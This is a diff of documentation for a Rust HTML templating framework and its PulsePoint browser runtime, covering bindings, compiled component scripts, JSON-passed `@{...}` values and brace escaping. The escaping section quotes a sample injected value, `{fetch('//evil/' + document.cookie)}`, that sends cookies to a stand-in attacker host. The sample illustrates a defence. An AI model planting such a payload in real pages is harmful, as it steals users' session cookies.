@@ -196,34 +196,30 @@ pub fn Button(bindings: Bindings, children: Html) -> Html {
 // renders <button class="btn" onclick={save()} title={label}>Save</button>
 ```
 
-Each binding lands in the form an element writes it: a native handler
-(`onclick`) as JavaScript, and everything else — a value, `on-select`, a
+Each binding keeps its authored expression. A native handler (`onclick`)
+travels in inert compiler-owned `pp-on*` metadata, which PulsePoint removes
+when it installs the registered event listener. Everything else — a value, `on-select`, a
 `pp-ref` — as an expression in braces. Only `html!` builds a `Bindings`,
 from the source written at the tag, so its expressions stay live. A tag that
 writes a `{…}` prop on a component without a `bindings` parameter is a
 compile error naming the field.
 
-Every other spread value is data, braces escaped. A component that composes
-client code in Rust — a handler from a builder, a caller's binding under a new
-name — writes it with `Attrs::bind`, the explicit form for code the author
-wrote, never for a value from a request:
+Every other spread value is data, braces escaped. Client code is written in
+`html!` and nowhere else: that is where it is compiled into the application,
+and the browser runtime runs nothing that was not, so a binding a component
+assembled from a Rust string would never run. A component passes a caller's
+bindings on by spreading `bindings`, and combines attribute sets with `merge`
+and `only`:
 
 ```rust
-let attrs = Attrs::new()
-    .bind("onclick", "toggle()")                   // onclick={toggle()}
-    .bind("checked", "pp.props.checkedProp")       // live
-    .set("title", "{not code}");                   // data: braces escaped
-let merged = own.merge(&caller);                  // last-wins, bindings kept
+let attrs = Attrs::new().set("title", "{not code}"); // data: braces escaped
+let merged = own.merge(&caller);                     // last-wins
 let aria = caller.only(|name| name.starts_with("aria-"));
 ```
 
-`merge` folds one set into another and `only` takes a subset; both keep a
-binding a binding. Rebuilding a set from `iter()` and `set` turns every
-binding into text.
-
 `<script>` and `<style>` bodies are raw text. Browser JavaScript/CSS braces
-remain literal. `@{...}` is supported inside `<script>` and renders through
-`RenderJs`; it is not lifted inside `<style>`.
+remain literal. `@{...}` is supported inside `<script>`; it is not lifted
+inside `<style>`.
 
 ### Scripts
 
@@ -244,34 +240,52 @@ html! {
 }
 ```
 
-`@{expr}` is lifted from it as a Rust expression, rendered through
-`RenderJs`; write `@@{` for a literal `@{`. Keep large modules in
+A bare `<script>` is the component's script. `html!` compiles it when the
+application is built, and the page carries only an empty element naming it,
+`<script pp-script="…" pp-data="[…]"></script>`; the browser runtime runs the
+compiled function from the client registry. JavaScript that is not valid is a
+compile error on the template.
+
+Each `@{expr}` is a server value. Its value is written as JSON into the
+element's `pp-data`, and the compiled script reads it where the `@{…}` stood,
+so an `@{…}` goes where a JavaScript value goes — `const name =
+@{Json(&user.name)};`, `pp.state(@{count})` — never inside a string literal or
+as part of a name. Write `@@{` for a literal `@{`. A `<script>` with
+attributes — `type="application/json"`, `src` — is not a component script and
+is written as it stands, its `@{…}` rendered in place. Keep large modules in
 `public/js/` and load them with `import()`.
 
 ## Escaping and Trusted Markup
 
 Rust strings and values are escaped in text and attribute position. Attributes
-also escape quotes. Braces are escaped too, as `&#123;` and `&#125;`: the
-browser runtime compiles every `{…}` it finds in a reactive block, so a stored
-value such as `{fetch('//evil/' + document.cookie)}` would otherwise run as
-code. The page shows the braces as text. `Html` is already trusted and passes
-through with its braces live.
+also escape quotes. Braces are escaped too, as `&#123;` and `&#125;`, so a
+stored value such as `{fetch('//evil/' + document.cookie)}` shows as text and
+never even looks like a binding. The browser runtime only runs code a template
+compiled, so a `{…}` nobody wrote in `html!` stays text either way.
 
 - `Html::escape(text)` creates safe text markup.
 - `Html::from_raw(raw)` trusts the caller completely; use only with sanitized
-  or framework-authored markup.
+  or framework-authored markup. Its braces are not escaped, and the runtime
+  evaluates a `{…}` in it when that is a bare name in scope or the exact source
+  of a binding some template compiled — so never pass request data through it.
 - `Html::empty()` represents no output.
 - `Html::concat(iter)` joins several `Html` fragments in order.
 - `Option<T: Render>` renders its value or nothing.
 
-Inside `<script>`, primitives render as JavaScript literals, strings are JSON
-quoted, `Option::None` is `null`, and `Json(&serializable_value)` embeds
-objects/arrays. Rahti neutralizes `<` in serialized script values to prevent a
-value from closing the surrounding script.
+The values of a component script's `@{…}` arrive as JSON: integers, floats and
+booleans as numbers and booleans, strings and `char`s as JSON strings,
+`Option::None` and a non-finite float as `null`, and `Json(&serializable_value)`
+as objects and arrays. In a typed `<script>` the same text is written in
+place, with `<` neutralized so a value cannot close the script.
 
-To show literal PulsePoint braces as text, use a brace character reference
-such as `"&#123;user&#125;"`; the macro protects it so the browser runtime
-does not treat it as a binding.
+A `{…}` inside quoted text or a quoted attribute value is a compile error when
+it holds a JavaScript expression — `"Hi {name}"`, `class="row {active}"` —
+because the runtime would read it as code no template compiled. Write the
+binding outside the quotes: `"Hi "{name}`, `class={"row " + active}`. Braces
+around anything that is not an expression are text
+(`data-config="{&quot;a&quot;: 1}"`). To show a brace as text, use a brace
+character reference such as `"&#123;user&#125;"`; the macro protects it so the
+browser runtime does not treat it as a binding.
 
 The root layout's `<slot />` sits inside a deferred `<template
 pp-component>`, and the browser decodes one layer of character references as
